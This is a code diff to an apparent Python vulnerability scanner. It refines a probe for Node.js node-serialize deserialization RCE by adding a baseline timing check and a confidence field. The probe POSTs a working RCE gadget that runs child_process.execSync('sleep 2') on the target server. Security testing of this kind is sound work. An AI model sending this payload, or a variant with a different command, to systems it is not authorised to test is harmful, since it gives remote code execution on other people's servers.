@@ -66,21 +66,28 @@ class DeserializationExpert:
     def _probe_node_deserialization(self, url, logger):
         # Testing for node-serialize RCE vector
         found = []
+        import time
         try:
+            # 0. Baseline duration
+            b_start = time.time()
+            self.session.get(url, timeout=5)
+            baseline_duration = time.time() - b_start
+
             # Payload that causes a delay if deserialized via node-serialize
-            # _$$ND_FUNC$$_function (){ require('child_process').execSync('sleep 2') }()
             payload = '{"rce":"_$$ND_FUNC$$_function (){ require(\'child_process\').execSync(\'sleep 2\') }()"}'
             
-            start = requests.compat.time.time()
+            start = time.time()
             # We try sending it in a common cookie name or as JSON body
             self.session.post(url, json=json.loads(payload), timeout=10)
-            duration = requests.compat.time.time() - start
+            duration = time.time() - start
             
-            if duration >= 2:
+            # Validation: must be at least 2s and significantly slower than baseline
+            if duration >= 2 and duration > (baseline_duration + 1.5):
                 found.append({
                     "title": "Confirmed Node.js Deserialization RCE",
-                    "description": f"Verified RCE on {url} via node-serialize gadget. The server was delayed by 2 seconds via sleep command.",
+                    "description": f"Verified RCE on {url} via node-serialize gadget. The server was delayed by 2 seconds via sleep command (Baseline: {baseline_duration:.2f}s, Attack: {duration:.2f}s).",
                     "severity": "critical",
+                    "confidence": "high",
                     "tool_source": "deserialization_expert",
                     "url": url,
                     "repro_payload": payload
